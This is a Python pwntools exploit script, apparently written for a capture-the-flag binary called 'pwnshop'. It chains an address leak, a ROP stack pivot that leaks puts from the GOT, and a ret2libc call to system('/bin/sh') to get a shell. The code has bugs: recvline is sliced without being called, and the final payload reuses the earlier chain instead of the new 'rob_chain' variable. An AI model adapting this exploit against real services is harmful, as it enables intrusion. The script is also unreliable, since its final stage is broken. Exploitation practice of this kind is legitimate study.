
from pwn import *

context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/pwnshop'

buy_padding_offset = 72
leak_padding_offset = 8
rop_padding_offset = 40

log.info('Create IO')
#io = remote('', )
io = process(executable)

log.info('get leaked address')

io.sendlineafter('\n> ', '2')
io.sendlineafter('sell? ', 'qq')
leak_padding = b'7' * leak_padding_offset
io.sendlineafter('it? ', leak_padding)

binary_offset = io.recvline().split(leak_padding)[1].split(b'?')[0]
binary_offset = bytearray(binary_offset).ljust(8, b'\x00')
binary_offset = u64(binary_offset, endian='little')
binary_offset -= 0x40c0
log.success(f'Leaked binary offset: {str(hex(binary_offset))}')


log.info('leaking LIBC address with stack pivot')

got_puts = p64(binary_offset + 0x4018)
plt_puts = p64(binary_offset + 0x1030)
pop_rdi = p64(binary_offset + 0x13c3)
buy_function = p64(binary_offset + 0x132a)
padding_to_rop = b'a' * rop_padding_offset

rop_chain = pop_rdi + got_puts + plt_puts + buy_function
padding_to_stack_pivot = (buy_padding_offset - len(padding_to_rop) - len(rop_chain)) * b'b'
sub_rsp = p64(0x1219 + binary_offset)

payload = padding_to_rop + rop_chain + padding_to_stack_pivot + sub_rsp
print(payload)

io.sendlineafter('\n> ', '1')
io.sendafter('Enter details: ', payload)

leaked_puts_libc = io.recvline[:6]
leaked_puts_libc = bytearray(leaked_puts_libc).ljust(8, b'\x00')
leaked_puts_libc = u64(leaked_puts_libc, endian='little')
log.success(f'Leaked puts@GLIBCL offset: {str(hex(leaked_puts_libc))}')


log.info('find offsets in libc')
libc_puts = 0x765f0
libc_system = 0x48e50
libc_sh = 0x18a156

libc_offset = leaked_puts_libc - libc_puts

system = p64(libc_offset + libc_system)
log.info(f'Calculated System Location: {str(hex(u64(system)))}')
sh = p64(libc_offset + libc_sh)
log.info(f'Calculated Sh Location: {str(hex(u64(sh)))}')

rob_chain = pop_rdi + sh + system
padding_to_stack_pivot = (buy_padding_offset - len(padding_to_rop) - len(rop_chain)) * b'b'
payload = padding_to_rop + rop_chain + padding_to_stack_pivot + sub_rsp

io.sendafter('Enter details: ', payload)

io.interactive()

